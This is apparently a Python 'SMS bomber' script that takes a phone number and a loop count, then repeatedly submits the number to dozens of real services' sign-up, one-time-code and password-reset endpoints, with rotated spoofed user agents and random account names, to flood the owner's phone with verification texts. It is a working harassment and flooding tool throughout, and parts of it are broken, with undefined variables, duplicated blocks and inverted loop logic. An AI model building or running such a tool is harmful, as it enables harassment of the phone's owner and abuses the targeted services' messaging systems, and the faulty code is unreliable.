import os, random, requests, sys, re, string, datetime, argparse
from termcolor import colored
from core.colors import FG
import time

def net_check():
    try:
        requests.get('https://motherfuckingwebsite.com/', verify=True)
    except:
        print(colored("[!] Bad internet spotted","blue"))
        print(colored("[!] Check your internet connection!","blue"))
        sys.exit()

def phone_check(phone):
    pat = re.compile(r"79\d{9}")
    if not re.fullmatch(pat, phone):
        print(colored("\n[!] Wrong phone number!","green"))
        sys.exit()


heads = [
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]

def smsbanner():
    print(colored('''

___           ___    ___    _____  _   _  ___    ___   
(  _`\ /'\_/`\(  _`\ (  _`\ (  _  )( ) ( )(  _`\ |  _`\ 
| (_(_)|     || (_(_)| (_) )| (_) || |_| || (_(_)| (_) )
`\__ \ | (_) |`\__ \ |  _ <'|  _  ||  _  ||  _)_ | ,  / 
( )_) || | | |( )_) || (_) )| | | || | | || (_( )| |\ \ 
`\____)(_) (_)`\____)(____/'(_) (_)(_) (_)(____/'(_) (_)                                                                                                                                   
    ''','red'))

def menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    smsbanner()
    net_check()
    global phone
    global name
    global iteration
    iteration = 0
    name = ''
    phone = input(colored("[*] > Enter phone number without + :  ","red"))
    count = int(input(colored("[*] > Enter the number of loops (zero is infinity) :  ","red")))
    print(f"{FG.red}[*] > Spam to {phone} now started!{FG.red}")
    phone_check(phone)

    if count >= 0:
        while True:
            bombing()
            iteration += 1
            print(f"{FG.red}{iteration}, loop passed.{FG.red}")


    else:
        for i in range(count):
            bombing()
            iteration += 1
            print(f"{FG.red}{iteration}, loop passed.{FG.red}")
            print(f"{FG.red}Spam has been ended{FG.red}")
            input(f"{FG.red}Press enter to exit...{FG.red}")
            sys.exit()




        
def bombing():
    HEADERS = random.choice(heads)
    global phone
    global name
    global iteration
    if phone[0] == '+':
        phone = phone[1:]
    if phone[0] == '8':
        phone = '7' + phone[1:]
    if phone[0] == '9':
        phone = '7' + phone
    for x in range(12):
        name = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    phone9 = phone[1:]
    phone_plus = '+' + phone
    phone8 = '8' + phone[1:]
    email = name+f'{iteration}'+'@gmail.com'
    email = name+f'{iteration}'+'@gmail.com'
    print(f"{FG.blue}")
    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone}, headers=HEADERS)
        print('SunLight: sms sended')
    except:
        print('SunLight: sms not sended')

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json = {"phone": phone_plus, "api": 2, "email": "email","x-email": "x-email"}, headers=HEADERS)
        print('iCloud: sms sended')
    except:
        print('iCloud: sms not sended')

    try:
    	requests.post('https://b.utair.ru/api/v1/login/', data = {'login':phone8}, headers=HEADERS)
    	print('Utair: sms sended')
    except:
        print('Utair: sms not sended')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":phone}, headers=HEADERS)
        print('Tinder: sms sended')
    except:
        print('Tinder: sms not sended')

    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": phone_plus}, headers=HEADERS)
        print('ok.ru: sms sended')
    except:
        print('ok.ru: sms not sended')

    try:
    	requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":phone}, headers=HEADERS)
    	print('karusel: sms sended')
    except:
        print('karusel: sms not sended')

    try:
        requests.post('https://youdrive.today/login/web/phone', data = {'phone': phone9, 'phone_code': '7'},headers=HEADERS)
        print('YouDrive: sms sended')
    except:
        print('YouDrive: sms not sended')

    try:
    	requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers=HEADERS)
    	print('MTS TV: sms sended')
    except:
        print('MTS TV: sms not sended')

    try:
    	requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":phone_plus}, headers=HEADERS)
    	print('youla: sms sended')
    except:
        print('youla: sms not sended')

    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + phone}, headers=HEADERS)
        print('eda.yandex: sms not sended')
    except:
        print('eda.yandex: sms not sended')

    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": phone}, headers=HEADERS)
        print('IVI: sms sended')
    except:
        print('IVI: sms not sended')

    try:
        requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3}, headers=HEADERS)
        print('DeliTime: sms sended')
    except:
        print('DeliTime: sms not sended')

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
        print('ICQ: sms sended')
    except:
        print('ICQ: sms not sended')

    try:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        print('Grabaxi: sms sended')
    except:
        print('GrabTaxi: sms not sended')

    try:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone9}).json()['res']
        print('RuTaxi: sms sended')
    except:
        print('RuTaxi: sms not sended')

    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': phone_plus}, headers={})
        print('Tinkoff: sms sended')
    except:
        print('Tinkoff: sms not sended')

    try:
        requests.post('https://www.rabota.ru/remind', data={'credential': phone})
        print('rabota.ru: sms sended')
    except:
        print('rabota.ru: sms not sended')

    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': phone_plus})
        print('Rutube: sms sended')
    except:
        print('Rutube: sms not sended')

    try:
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': name,'phone': phone, 'promo': 'yellowforma'})
        print('Smsint: sms sended')
    except:
        print('Smsint: sms not sended')

    try:
        requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone=' + phone9 + '&country_code=%2B7&nod=4&locale=en')
        print('Oyorooms: sms sended')
    except:
        print('Oyorooms: sms not sended')

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': phone,'g-recaptcha-response': '','recaptcha': 'on'})
        print('mvideo: sms sended')
    except:
        print('mvideo: sms not sended')

    try:
        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
        print('Newnext: sms sended')
    except:
        print('Newnext: sms not sended')

    try:
        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})
        print('Invitro: sms sended')
    except:
        print('Invitro: sms not sended')

    try:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
        print('Psbank: sms sended')
    except:
        print('PSbank: sms not sended')

    try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
        print('Beltelcom: sms sended')
    except:
        print('Beltelcom: sms not sended')

    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})
        print('KFC: sms sended')
    except:
        print('KFC: sms not sended')

    try:
        requests.post('https://api.carsmile.com/',json={'operationName': 'enterPhone', 'variables': {'phone': phone},'query': 'mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n'})
        print('Carsmile: sms sended')
    except:
        print('Carsmile: sms not sended')

    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/')
        print('Citilink: sms sended')
    except:
        print('CitiLink: sms not sended')

    try:
        requests.post('https://terra-1.indriverapp.com/api/authorization?locale=ru',data={'mode': 'request', 'phone': '+' + phone,'phone_permission': 'unknown', 'stream_id': 0, 'v': 3, 'appversion': '3.20.6','osversion': 'unknown', 'devicemodel': 'unknown'})
        print('InDriver: sms sended')
    except:
        print('Indriver: sms not sended')

    try:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formattedphone})
        print('Lenta: sms sended')
    except:
        print('Lenta: sms not sended')

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={'phone': '+' + phone, 'api': 2, 'email': 'email','x-email': 'x-email'})
        print('Mail.ru: sms sended')
    except:
        print('Mail.ru: sms not sended')

    try:
        requests.post('https://plink.tech/register/',json={'phone': phone})
        print('Plink: sms sended')
    except:
        print('Plink: sms not sended')

    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": phone}, headers=HEADERS)
        print('Qlean: sms sended')
    except:
        print('Qlean: sms not sended')

    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
        print('Twitch: sms sended')
    except:
        print('Twitch: sms not sended')

    try:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={'phone': phone})
        print('DeliveryClub: sms sended')
    except:
        print('DeliveryClub: sms not sended')

    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + phone}, headers=HEADERS)
        print('Invitro: sms sent')
    except:
        print('Invitro: sms not sended')

    try:
        requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
        print('PizzaHut: sms sent')
    except:
        print('PizzaHut: sms not sended')

    try:
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
        print('Smsint: sms sent')
    except:
        print('Smsint sms not sended')

    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/')
        print('Citilink: sms sended')
    except:
        print('CitiLink: sms not sended')

    try:
        requests.post('https://api.carsmile.com/',json={'operationName': 'enterPhone', 'variables': {'phone': phone},'query': 'mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n'})
        print('Carsmile: sms sended')
    except:
        print('Carsmile: sms not sended')

    try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
        print('Beltelcom: sms sended')
    except:
        print('Beltelcom: sms not sended')

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={'phone': '+' + phone, 'api': 2, 'email': 'email','x-email': 'x-email'})
        print('Mail.ru: sms sended')
    except:
        print('Mail.ru: sms not sended')

    try:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
        print('Psbank: sms sended')
    except:
        print('PSbank: sms not sended')

    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': phone_plus}, headers=HEADERS)
        print('Rutube: sms sended')
    except:
        print('Rutube: sms not sended')

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
        print('ICQ: sms sended')
    except:
        print('ICQ: sms not sended')

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":phone_plus}, headers=HEADERS)
        print('youla: sms sended')
    except:
        print('youla: sms not sended')


    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers=HEADERS)
        print('MTS TV: sms sended')
    except:
        print('MTS TV: sms not sended')
